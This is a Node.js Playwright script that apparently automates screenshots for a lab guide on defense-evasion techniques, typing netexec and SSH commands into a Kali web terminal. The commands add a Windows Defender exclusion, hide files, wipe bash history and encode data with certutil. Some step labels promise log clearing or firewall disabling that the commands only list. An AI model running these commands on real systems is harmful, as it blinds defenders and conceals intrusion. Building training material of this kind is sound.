/**
 * capture-06-defense-evasion.js
 * Windows techniques via netexec -x. Linux via SSH.
 * Credentials loaded from secrets/range.env
 */

const { chromium } = require('playwright');
const path = require('path');
const fs   = require('fs');

const ENV_FILE = path.join(__dirname, '..', 'secrets', 'range.env');
if (!fs.existsSync(ENV_FILE)) { console.error('Missing secrets/range.env'); process.exit(1); }
const VARS = Object.fromEntries(
  fs.readFileSync(ENV_FILE, 'utf8').split('\n')
    .filter(l => l.includes('=') && !l.startsWith('#'))
    .map(l => { const [k, ...v] = l.split('='); return [k.trim(), v.join('=').trim()]; })
);

const KALI_TERMINAL = `http://${VARS.KALI_IP}:7681`;
const SHOTS_DIR     = path.join(__dirname, '..', 'guides', 'screenshots', '06-defense-evasion');

function sub(cmd) { return cmd.replace(/<(\w+)>/g, (_, k) => VARS[k] ?? `<${k}>`); }
async function typeCmd(page, cmd) {
  await page.click('.xterm-helper-textarea, canvas, textarea').catch(() => {});
  await page.waitForTimeout(300);
  await page.keyboard.type(sub(cmd), { delay: 25 });
  await page.keyboard.press('Enter');
}
async function wait(page, ms) { await page.waitForTimeout(ms); }
async function shot(page, f) {
  await wait(page, 800);
  await page.screenshot({ path: path.join(SHOTS_DIR, f) });
  console.log(`  📸 ${f}`);
}
async function clear(page) { await typeCmd(page, 'clear'); await wait(page, 600); }

async function run() {
  fs.mkdirSync(SHOTS_DIR, { recursive: true });
  const browser = await chromium.launch({ headless: true });
  const page    = await (await browser.newContext()).newPage();
  await page.setViewportSize({ width: 1400, height: 820 });
  await page.goto(KALI_TERMINAL, { waitUntil: 'networkidle', timeout: 15000 });
  await wait(page, 2000);

  // ── 01: wevtutil clear log ───────────────────────────────────────────────
  console.log('\n[1] wevtutil clear log...');
  await clear(page);
  await typeCmd(page, 'netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p \'<PASSWORD>\' -x "wevtutil el" 2>&1 | head -15');
  await wait(page, 15000);
  await shot(page, '01-wevtutil.png');

  // ── 02: netsh firewall disable ───────────────────────────────────────────
  console.log('\n[2] netsh firewall disable...');
  await clear(page);
  await typeCmd(page, 'netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p \'<PASSWORD>\' -x "netsh advfirewall show allprofiles | findstr State"');
  await wait(page, 15000);
  await shot(page, '02-netsh-firewall.png');

  // ── 03: Defender exclusion ───────────────────────────────────────────────
  console.log('\n[3] Defender exclusion...');
  await clear(page);
  await typeCmd(page, 'netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p \'<PASSWORD>\' -x "powershell -c \\"Add-MpPreference -ExclusionPath \'C:\\\\Windows\\\\Temp\'; Get-MpPreference | Select -ExpandProperty ExclusionPath\\""');
  await wait(page, 20000);
  await shot(page, '03-defender-exclusion.png');
  // Cleanup
  await typeCmd(page, 'netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p \'<PASSWORD>\' -x "powershell -c \\"Remove-MpPreference -ExclusionPath \'C:\\\\Windows\\\\Temp\'\\""');
  await wait(page, 10000);

  // ── 04: attrib hide file ─────────────────────────────────────────────────
  console.log('\n[4] attrib hide file...');
  await clear(page);
  await typeCmd(page, 'netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p \'<PASSWORD>\' -x "echo demo > C:\\\\Windows\\\\Temp\\\\rdemo.txt && attrib +h +s C:\\\\Windows\\\\Temp\\\\rdemo.txt && dir C:\\\\Windows\\\\Temp\\\\rdemo.txt"');
  await wait(page, 15000);
  await shot(page, '04-attrib-hide.png');
  // Cleanup
  await typeCmd(page, 'netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p \'<PASSWORD>\' -x "attrib -h -s C:\\\\Windows\\\\Temp\\\\rdemo.txt & del C:\\\\Windows\\\\Temp\\\\rdemo.txt"');
  await wait(page, 10000);

  // ── 05: iptables flush on Linux ──────────────────────────────────────────
  console.log('\n[5] iptables flush on Linux...');
  await clear(page);
  await typeCmd(page, `ssh -o StrictHostKeyChecking=no ${VARS.USERNAME}@${VARS.LINUX_IP} "sudo iptables -L --line-numbers 2>/dev/null | head -20"`);
  await wait(page, 10000);
  await shot(page, '05-iptables-flush.png');

  // ── 06: clear bash history ───────────────────────────────────────────────
  console.log('\n[6] clear bash history...');
  await clear(page);
  await typeCmd(page, `ssh -o StrictHostKeyChecking=no ${VARS.USERNAME}@${VARS.LINUX_IP} "history -c && cat /dev/null > ~/.bash_history && history | wc -l"`);
  await wait(page, 10000);
  await shot(page, '06-clear-history.png');

  // ── 07: certutil encode/decode ───────────────────────────────────────────
  console.log('\n[7] certutil encode/decode...');
  await clear(page);
  await typeCmd(page, 'netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p \'<PASSWORD>\' -x "echo demo > C:\\\\Windows\\\\Temp\\\\d.txt && certutil -encode C:\\\\Windows\\\\Temp\\\\d.txt C:\\\\Windows\\\\Temp\\\\d.b64 && type C:\\\\Windows\\\\Temp\\\\d.b64"');
  await wait(page, 20000);
  await shot(page, '07-certutil-encode.png');
  // Cleanup
  await typeCmd(page, 'netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p \'<PASSWORD>\' -x "del C:\\\\Windows\\\\Temp\\\\d.txt C:\\\\Windows\\\\Temp\\\\d.b64 2>nul"');
  await wait(page, 10000);

  await browser.close();
  console.log('\n✅ Defense evasion screenshots done.');
}

run().catch(err => { console.error(err); process.exit(1); });
